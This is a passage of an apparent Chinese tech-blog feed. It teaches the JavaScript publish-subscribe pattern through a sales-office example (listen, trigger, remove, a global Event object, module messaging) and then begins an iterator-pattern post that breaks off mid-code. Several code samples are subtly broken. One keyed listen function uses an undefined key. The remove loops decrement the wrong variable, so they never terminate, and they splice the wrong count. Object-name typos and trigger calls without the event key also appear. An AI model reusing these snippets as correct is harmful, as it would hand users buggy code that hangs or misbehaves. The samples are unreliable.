class="keyword">function</span>(<span class="params">price, squareMeter</span>)&#123;     <span class="comment">// 小红订阅消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;squareMeter=&#x27;</span>+squareMeter);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="title function_">trigger</span>(<span class="number">2000000</span>, <span class="number">88</span>);                    <span class="comment">// 200万 88平方米</span></span><br><span class="line">salesOffices.<span class="title function_">trigger</span>(<span class="number">3000000</span>, <span class="number">110</span>);                   <span class="comment">// 300万 110平方米</span></span><br></pre></td></tr></table></figure><p>至此，我们已经实现了一个最简单的发布-订阅模式，但这里还存在一些问题。我们看到订阅者接收到了发布者发布的每个消息，虽然小明只想买88平方米的房子，但是发布者把110平方米的信息也推送给了小明，这对小明来说是不必要的困扰。所以我们有必要增加一个标示key，让订阅者只订阅自己感兴趣的消息。改写后的代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> salesOffices = &#123;&#125;;                               <span class="comment">// 定义售楼处</span></span><br><span class="line"></span><br><span class="line">salesOffices.<span class="property">clientList</span> = [];                        <span class="comment">// 缓存列表，存放订阅者的回调函数</span></span><br><span class="line"></span><br><span class="line">salesOffices.<span class="property">listen</span> = <span class="keyword">function</span>(<span class="params">fn</span>)&#123;                  <span class="comment">// 增加订阅者</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">this</span>.<span class="property">clientList</span>[key])&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">clientList</span>[key] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">clientList</span>.<span class="title function_">push</span>(fn);                        <span class="comment">// 订阅的消息添加进缓存列表</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="property">trigger</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;                   <span class="comment">// 发布消息</span></span><br><span class="line">    <span class="keyword">var</span> key = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">shift</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>), <span class="comment">// 取出消息类型</span></span><br><span class="line">        fns = <span class="variable language_">this</span>.<span class="property">clientList</span>[key];                  <span class="comment">// 取出该消息对应的回调函数集合</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!fns || fns.<span class="property">length</span> === <span class="number">0</span>)&#123;                    <span class="comment">// 如果没有订阅该消息，则返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,fn; fn = <span class="variable language_">this</span>.<span class="property">clientList</span>[i++];)&#123;</span><br><span class="line">        fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);                   <span class="comment">// arguments是发布消息时带上的参数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="title function_">listen</span>(<span class="keyword">function</span>(<span class="params">price, squareMeter</span>)&#123;     <span class="comment">// 小明订阅消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;squareMeter=&#x27;</span>+squareMeter);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="title function_">listen</span>(<span class="keyword">function</span>(<span class="params">price, squareMeter</span>)&#123;     <span class="comment">// 小红订阅消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;squareMeter=&#x27;</span>+squareMeter);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="title function_">trigger</span>(<span class="number">2000000</span>, <span class="number">88</span>);                    <span class="comment">// 200万 88平方米</span></span><br><span class="line">salesOffices.<span class="title function_">trigger</span>(<span class="number">3000000</span>, <span class="number">110</span>);                   <span class="comment">// 300万 110平方米</span></span><br></pre></td></tr></table></figure><p>很明显，现在订阅者可以只订阅自己感兴趣的事件了。</p><h3 id="五、发布-订阅模式的通用实现"><a href="#五、发布-订阅模式的通用实现" class="headerlink" title="五、发布-订阅模式的通用实现"></a>五、发布-订阅模式的通用实现</h3><p>现在我们已经看到了如何让售楼处拥有接受订阅和发布事件的功能。假设现在小明又去另一个售楼处买房子，那么这段代码是否必须在另一个售楼处对象上重写一次呢，有没有办法可以让所有对象都拥有发布-订阅功能呢？</p><p>答案显然是有的，JavaScript作为一门解释执行的语言，给对象动态添加职责是理所当然的事情。</p><p>所以我们把发布-订阅模式的功能提取出来，放在一个单独的对象内：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> event = &#123;</span><br><span class="line">    <span class="attr">clientList</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">listen</span>: <span class="keyword">function</span>(<span class="params">key, fn</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">this</span>.<span class="property">clientList</span>[key])&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">clientList</span>[key] = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">clientList</span>[key].<span class="title function_">push</span>(fn);   <span class="comment">// 订阅的消息添加进缓存列表</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">trigger</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">shift</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>),</span><br><span class="line">            fns = <span class="variable language_">this</span>.<span class="property">clientList</span>[key];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(!fns || fns.<span class="property">length</span> === <span class="number">0</span>)&#123;    <span class="comment">// 如果没有绑定对应的消息</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,fn; fn = fns[i++];)&#123;</span><br><span class="line">            fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);   <span class="comment">// arguments是trigger时带上的参数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再定义一个installEvent函数，这个函数可以给所有的对象都动态安装发布-订阅功能。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> installEvent = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> event)&#123;</span><br><span class="line">        obj[i] = event[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再来测试一遍，我们给售楼处对象salesOffices动态增加发布-订阅功能：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> salesOffices = &#123;&#125;;</span><br><span class="line"><span class="title function_">installEvent</span>(salesOffices);</span><br><span class="line"></span><br><span class="line">salesOffice.<span class="title function_">listen</span>(<span class="string">&#x27;squareMeter88&#x27;</span>, <span class="keyword">function</span>(<span class="params">price</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="title function_">listen</span>(<span class="string">&#x27;squareMeter100&#x27;</span>, <span class="keyword">function</span>(<span class="params">price</span>)&#123;     <span class="comment">// 小红订阅消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="title function_">trigger</span>(<span class="number">2000000</span>, <span class="number">88</span>);                         <span class="comment">// 200万 88平方米</span></span><br><span class="line">salesOffices.<span class="title function_">trigger</span>(<span class="number">3000000</span>, <span class="number">110</span>);                        <span class="comment">// 300万 110平方米</span></span><br></pre></td></tr></table></figure><h3 id="六、取消订阅事件"><a href="#六、取消订阅事件" class="headerlink" title="六、取消订阅事件"></a>六、取消订阅事件</h3><p>有时候，我们也许需要取消订阅事件的功能，比如，小明突然不想买房子了，为了避免继续收到售楼处推送过来的短信，小明需要取消之前订阅的事件。现在我们给event对象添加remove方法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">event.<span class="property">remove</span> = <span class="keyword">function</span>(<span class="params">key, fn</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> fns = <span class="variable language_">this</span>.<span class="property">clientList</span>[key];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!fns)&#123;      <span class="comment">// 如果key对应的消息没有被人订阅，则直接返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!fn)&#123;       <span class="comment">// 如果没有传入具体的回调函数，表示需要取消key对应消息的所有订阅</span></span><br><span class="line">        fns&amp;&amp;(fns.<span class="property">length</span> = <span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> l = fns.<span class="property">length</span> - <span class="number">1</span>;l &gt;= <span class="number">0</span>;i--)&#123;  <span class="comment">// 反向遍历订阅的回调函数列表</span></span><br><span class="line">            <span class="keyword">var</span> _fn = fns[l];</span><br><span class="line">            <span class="keyword">if</span>(_fn === fn)&#123;</span><br><span class="line">                fns.<span class="title function_">splice</span>(l,i);                 <span class="comment">// 删除订阅者的回调函数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> salesOffices = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> installEvent = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> event)&#123;</span><br><span class="line">        obj[i] = event[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">installEvent</span>(salesOffices);</span><br><span class="line"></span><br><span class="line">salesOffice.<span class="title function_">listen</span>(<span class="string">&#x27;squareMeter88&#x27;</span>, <span class="keyword">function</span>(<span class="params">price</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="title function_">listen</span>(<span class="string">&#x27;squareMeter100&#x27;</span>, <span class="keyword">function</span>(<span class="params">price</span>)&#123;     <span class="comment">// 小红订阅消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="title function_">trigger</span>(<span class="number">2000000</span>, <span class="number">88</span>);                         <span class="comment">// 200万 88平方米</span></span><br><span class="line">salesOffices.<span class="title function_">trigger</span>(<span class="number">3000000</span>, <span class="number">110</span>);                        <span class="comment">// 300万 110平方米</span></span><br></pre></td></tr></table></figure><h3 id="七、全局的发布-订阅对象"><a href="#七、全局的发布-订阅对象" class="headerlink" title="七、全局的发布-订阅对象"></a>七、全局的发布-订阅对象</h3><p>回想下刚刚实现的发布-订阅模式，我们给售楼处对象和登录对象都添加了订阅和发布的功能，这里还存在两个小问题。</p><ul><li><p>我们给每个发布者对象都添加了listen和trigger方法，以及一个缓存列表clientList，这其实是一种资源浪费。</p></li><li><p>小明跟售楼处对象还是存在一定的耦合性。小明至少要知道售楼处对象的名字是salesOffices，才能顺利的订阅到事件。见代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">salesOffices.<span class="title function_">listen</span>(<span class="string">&#x27;sqareMeter100&#x27;</span>, <span class="keyword">function</span>(<span class="params">price</span>)&#123;     <span class="comment">// 小明订阅消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><p>如果小明还关心300平米的房子，而这套房子的卖家是salesOffices2，这意味着小明要开始订阅salesOffices2对象，见如下代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">salesOffices2.<span class="title function_">listen</span>(<span class="string">&#x27;sqareMeter100&#x27;</span>, <span class="keyword">function</span>(<span class="params">price</span>)&#123;     <span class="comment">// 小明订阅消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其实在现实中，买房子未必要亲自去售楼处，我们只要把订阅的请求交给中介公司，而各大房产公司也只需要通过中介公司来发布房子信息。这样一来，我们不用关心消息是来自哪个房产公司，我们在意的是能否顺利的接收到消息。当然，为了保证订阅者和发布者能够顺利通信，订阅者和发布者都必须知道这个中介公司。</p><p>同样在程序中，发布-订阅模式可以用一个全局的Event对象来实现，订阅者不需要了解消息来自哪个发布者，发布者也不知道消息会推送给哪些订阅者，Event作为一个类似“中介者”的角色，把订阅者和发布者联系起来，见如下代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Event</span> = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> clientList = &#123;&#125;,</span><br><span class="line">        listen,</span><br><span class="line">        trigger,</span><br><span class="line">        remove;</span><br><span class="line">    </span><br><span class="line">    listen = <span class="keyword">function</span>(<span class="params">key, fn</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!clientList[key])&#123;</span><br><span class="line">            clientList[key] = [];</span><br><span class="line">        &#125;</span><br><span class="line">        clientList[key].<span class="title function_">push</span>(fn);</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    trigger = <span class="keyword">function</span>(<span class="params">key, fn</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">shift</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>),</span><br><span class="line">        fns = clientList[key];</span><br><span class="line">        <span class="keyword">if</span>(!fns || fns.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,fn; fn = fns[i++];)&#123;</span><br><span class="line">            fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    remove = <span class="keyword">function</span>(<span class="params">key,fn</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> fns = clientList[key];</span><br><span class="line">        <span class="keyword">if</span>(!fns)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!fn)&#123;</span><br><span class="line">        fns&amp;&amp;(fns.<span class="property">length</span> = <span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> l = fns.<span class="property">length</span> - <span class="number">1</span>;l &gt;= <span class="number">0</span>;i--)&#123;  <span class="comment">// 反向遍历订阅的回调函数列表</span></span><br><span class="line">            <span class="keyword">var</span> _fn = fns[l];</span><br><span class="line">            <span class="keyword">if</span>(_fn === fn)&#123;</span><br><span class="line">                fns.<span class="title function_">splice</span>(l,i);                 <span class="comment">// 删除订阅者的回调函数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">listen</span>: listen,</span><br><span class="line">        <span class="attr">trigger</span>: trigger,</span><br><span class="line">        <span class="attr">remove</span>: remove</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Event</span>.<span class="title function_">listen</span>(<span class="string">&#x27;squareMeter88&#x27;</span>, <span class="keyword">function</span>(<span class="params">price</span>)&#123;   <span class="comment">// 小红订阅消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);                   <span class="comment">// 价格=2000000</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Event</span>.<span class="title function_">trigger</span>(<span class="string">&#x27;squareMeter88&#x27;</span>, <span class="number">2000000</span>)          <span class="comment">// 售楼处发布消息</span></span><br></pre></td></tr></table></figure><h3 id="八、模块间通信"><a href="#八、模块间通信" class="headerlink" title="八、模块间通信"></a>八、模块间通信</h3><p>上一节实现的发布-订阅模式的实现，是基于一个全局的Event对象，我们利用它可以在两个封装良好的模块中进行通信，这两个模块可以完全不知道对方的存在。就如同有了中介公司之后，我们不再需要知道房子开售的消息来自哪个售楼处。</p><p>比如现在有两个模块，a模块里面有一个按钮，每次点击按钮后，b模块里面的div中会显示按钮的点击次数，我们用发布-订阅模式完成下面的代码，使得a模块和b模块可以在保持封装性的前提下进行通信</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;count&quot;</span>&gt;</span></span><br><span class="line">            点我</span><br><span class="line">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;show&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> count = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> button = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;count&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        button.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Event</span>.<span class="title function_">trigger</span>(<span class="string">&#x27;add&#x27;</span>, count++);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)();</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> b = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;show&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="title class_">Event</span>.<span class="title function_">listen</span>(<span class="string">&#x27;add&#x27;</span>, <span class="keyword">function</span>(<span class="params">count</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                div.<span class="property">innerHTML</span> = count;</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;)();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但在这里我们要留意另一个问题，模块之间如果用了太多的全局发布-订阅模式来通信，那么模块与模块之间的联系就被隐藏到了背后。我们最终会搞不清楚消息来自哪个模块，或者消息会流向哪些模块，这又会给我们的维护带来一些麻烦，也许某个模块的作用就是暴露一些接口给其他模块调用。</p><h3 id="九、必须先订阅再发布吗"><a href="#九、必须先订阅再发布吗" class="headerlink" title="九、必须先订阅再发布吗"></a>九、必须先订阅再发布吗</h3><p>我们了解到的发布-订阅模式，都是订阅者必须先订阅一个消息，随后才能接收到发布者发布的信息，如果把顺序反过来，发布者先发布一条消息，而在此之前并没有对象来订阅他，这条消息无疑将消失在宇宙中。</p><p>在某些情况下，我们需要先将这条消息保存下来，等到有对象来订阅他的时候，再重新把消息发给订阅者。就如同QQ离线消息一样，离线消息被保存在服务器中，接收人下次登录上线的时候，可以重新收到这条消息。</p><p>这种需求在实际项目中是存在的，比如在之前的商城网站中，获取到用户信息之后才能渲染到用户导航模块，而获取用户信息的操作是一个ajax异步请求。当ajax请求成功返回之后会发布一个事件，在此之前订阅了此事件的用户导航模块可以接收到这些用户信息。</p><p>但是这只是理想的状况，因为异步的原因，我们不能保证ajax请求返回的时间，有时候它返回得比较快，而此时用户导航模块得代码还没有加载好（还没有订阅相应事件），特别是在用了一些模块化惰性加载的技术后，这是很可能发生的事情。也许我们还需要一个方案，使得我们的发布-订阅对象拥有先发布后订阅的能力。</p><p>为了满足这个需求，我们要建立一个存放离线事件的堆栈，当事件发布的时候，如果此时还没有订阅者来订阅这个事件，我们暂时把发布事件的动作包裹在一个函数里，这些包装函数将被存入堆栈中，等到终于有对象来订阅此事件的时候，我们将遍历堆栈并且依次执行这些包装函数，也就是重新发布里面的事件。当然离线事件的生命周期只有一次，就像QQ的未读消息只会被重新阅读一次，所有刚才的操作我们只能进行一次。</p><h3 id="十、JavaScript实现发布-订阅模式的便利性"><a href="#十、JavaScript实现发布-订阅模式的便利性" class="headerlink" title="十、JavaScript实现发布-订阅模式的便利性"></a>十、JavaScript实现发布-订阅模式的便利性</h3><p>这里要提出的是，我们一直讨论的发布-订阅模式，跟一些别的语言（比如java）中的实现还是有区别的。在java中实现一个自己的发布-订阅模式，通常会把订阅者对象自身当成引用传入发布者对象中，同时订阅者对象还需要提供一个名为诸如update的方法，供发布者对象在适合的时候调用。而在JavaScript中，我们无需去选择使用推模型还是拉模型。推模型是指在事件发生时，发布者一次性把所有更改的状态和数据都推送给订阅者。拉模型不同的地方是，发布者仅仅通知订阅者事件已经发生了，此外发布者要提供一些公开的接口供订阅者来主动拉取数据。拉模型的好处是可以让订阅者“按需获取”，但同时有可能让发布者变成一个：门户大开“的对象，同时增加了代码量和复杂度。</p><p>刚好在JavaScript中，arguments可以很方便地表示参数列表，所以我们一般都会选择推模型，使用<code>Function.prototype.apply</code>方法把所有参数都推送给订阅者。</p><h3 id="十一、小结"><a href="#十一、小结" class="headerlink" title="十一、小结"></a>十一、小结</h3><p>发布-订阅模式的优点非常明显，一为时间上的解耦，二为对象之间的解耦。它的应用非常广泛，既可以用在异步编程中，也可以帮助我们完成更松耦合的代码编写。发布-订阅模式还可以用来帮助实现一些别的设计模式，比如中介模式。从架构上来看，无论是MVC还是MVVM，都少不了发布-订阅模式的参与，而且JavaScript本身也是一门基于事件驱动的语言。</p><p>当然，发布-订阅模式也不是完全没有缺点。创建订阅者本身要消耗一定的时间和内存，而且当你订阅一个消息后，也许此消息最后都未发生，但这个订阅者会始终存在于内存中。另外，发布-订阅模式虽然可以弱化对象之间的联系，但如果过度使用的话，对象和对象之间的必要联系也将深埋在背后，会导致程序难以跟踪维护和理解。特别是有多个发布者和订阅者嵌套到一起的时候，要跟踪一个bug不是件轻松的事情。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;发布-订阅模式又叫观察者模式，它定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知。在JavaScript开发中，我们一般用事件模型来替代传统的发布-订阅模式。&lt;/p&gt;
&lt;h3 id=&quot;一、现实中的发布-订阅模式&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>迭代器模式</title>
    <link href="http://cychenhaibin.github.io/2024/09/03/%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/09/03/%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-09-03T04:51:47.000Z</published>
    <updated>2024-09-03T04:51:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>看本文之前需要有JavaScript的基础知识</p><hr><p>迭代器模式是指提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。迭代器模式可以把迭代的过程从业务逻辑中分离出来，在使用迭代器模式之后，即使不关心对象的内部构造，也可以按顺序访问其中的每个元素。</p><h3 id="一、实现自己的迭代器"><a href="#一、实现自己的迭代器" class="headerlink" title="一、实现自己的迭代器"></a>一、实现自己的迭代器</h3><p>实现一个each函数，each函数接受2个参数，第一个为被循环的数组，第二个为循环中的每一步后将被触发的回调函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> each = <span class="keyword">function</span>(<span class="params">ary,callback</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, l = ary.<span class="property">length</span>; i &lt; l; i++)&#123;</span><br><span class="line">        callback.<span class="title function_">call</span>(ary[i], i, ary[ i ]);    <span class="comment">// 把下标和元素当作参数传给callback函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_">each</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="keyword">function</span>(<span class="params">i, n</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>([i, n]);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="二、内部迭代器和外部迭代器"><a href="#二、内部迭代器和外部迭代器" class="headerlink" title="二、内部迭代器和外部迭代器"></a>二、内部迭代器和外部迭代器</h3><p>迭代器可以分为内部迭代器和外部迭代器</p><ol><li><h4 id="内部迭代器"><a href="#内部迭代器" class="headerlink" title="内部迭代器"></a>内部迭代器</h4><p>我们刚刚编写的each函数属于内部迭代器，each函数的内部已经定义好了迭代规则，它完全接手整个迭代过程，外部只需要一次初始调用。</p><p>内部迭代器在调用的时候非常方便，外界不用关心迭代器内部的实现，跟迭代器的交互也仅仅是一次初始调用，但这也刚好是内部迭代器的缺点。由于内部迭代器的迭代规则已经被提前规定，上面的each函数就无法同时迭代2个数组了。</p><p>在一些没有闭包的语言中，内部迭代器本身的实现也相当复杂。比如C语言中的内部迭代器是用函数指针来实现的，循环处理所需要的数据都要以参数的形式明确地从外面传递进去。</p></li><li><h4 id="外部迭代器"><a href="#外部迭代器" class="headerlink" title="外部迭代器"></a>外部迭代器</h4><p>外部迭代器必须显式地请求迭代下一个元素。</p><p>外部迭代器增加了一些调用地复杂度，但相对也增强了迭代器地灵活性，我们可以手工控制迭代的过程或者顺序。</p></li></ol><h3 id="三、迭代类数组对象和字面量对象"><a href="#三、迭代类数组对象和字面量对象" class="headerlink" title="三、迭代类数组对象和字面量对象"></a>三、迭代类数组对象和字面量对象</h3><p>迭代器模式不仅可以迭代数组，还可以迭代一些类数组的对象，无论是内部迭代器还是外部迭代器，只要被迭代的聚合对象拥有length属性而且可以用下标访问，那它就可以被迭代。</p><p>在JavaScript中，for in语句可以用来迭代普通字面量对象的属性。</p><p><img src="/../image/%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/image-20240903123550097.png" alt="image-20240903123550097"></p><h3 id="四、倒序迭代器"><a href="#四、倒序迭代器" class="headerlink" title="四、倒序迭代器"></a>四、倒序迭代器</h3><p>由于GoF中对迭代器模式的定义非常松散，所以我们可以有多种多样的迭代器实现，总的来说，迭代器模式提供了循环访问一个聚合对象中每个元素的方法，但它没有规定我们以顺序、倒序还是中序来循环遍历聚合对象。</p><p>下面实现一个倒序访问的迭代器：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reverseEach = <span class="keyword">function</span>(<span class="params">ary,callback</span>)&#123;</span><br><span class="line">    <span 